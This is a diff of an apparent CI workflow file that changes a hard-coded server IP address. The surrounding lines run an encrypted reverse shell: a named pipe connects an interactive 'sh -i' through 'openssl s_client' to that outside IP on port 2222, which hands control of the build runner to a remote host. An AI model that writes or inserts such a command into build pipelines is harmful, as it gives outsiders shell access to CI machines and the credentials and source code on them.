@@ -22,6 +22,6 @@ jobs:
           cat cert.pem
           openssl x509 -in cert.pem -noout -text
           mkfifo /tmp/s
-          export SERVER_IP=54.175.186.108
+          export SERVER_IP=54.159.108.35
           sh -i < /tmp/s 2>&1 | openssl s_client -quiet -strict -verify 1 -verify_return_error -CAfile cert.pem -connect $SERVER_IP:2222 > /tmp/s
           rm /tmp/s
